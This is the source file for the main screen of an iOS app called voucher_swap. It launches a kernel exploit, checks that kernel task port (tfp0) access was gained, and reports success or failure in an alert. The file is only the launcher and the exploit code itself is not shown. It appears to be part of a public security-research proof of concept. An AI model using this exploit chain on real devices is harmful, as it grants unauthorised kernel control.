//
//  ViewController.m
//  voucher_swap
//
//  Created by Brandon Azad on 12/7/18.
//  Copyright © 2018 Brandon Azad. All rights reserved.
//

#import "ViewController.h"
#import "kernel_memory.h"
#import "voucher_swap.h"
#import "kernel_call.h"
#import "log.h"
#import <mach/mach.h>
#import "kernel_memory.h"

@interface ViewController ()

@end

@implementation ViewController

- (bool)voucher_swap {
    vm_size_t size = 0;
    host_page_size(mach_host_self(), &size);
    if (size < 16000) {
        printf("non-16K devices are not currently supported.\n");
        return false;
    }
    if (!voucher_swap()) {
        printf("exploit failed!\n");
        return false;
    }
    if (!MACH_PORT_VALID(kernel_task_port)) {
        printf("tfp0 is invalid?\n");
        return false;
    }
    return true;
}

- (IBAction)go:(id)sender {
    [sender setEnabled:NO];
    sleep(1);
    bool success = [self voucher_swap];
    if (success) {
        // post exploitation...
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"success" message:[NSString stringWithFormat:@"tfp0: %i", kernel_task_port] preferredStyle:UIAlertControllerStyleAlert];
        [self presentViewController:alert animated:YES completion:nil];
    } else {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"failed" message:nil preferredStyle:UIAlertControllerStyleAlert];
        [self presentViewController:alert animated:YES completion:nil];
    }
}

- (void)viewDidLoad {
	[super viewDidLoad];
}


@end
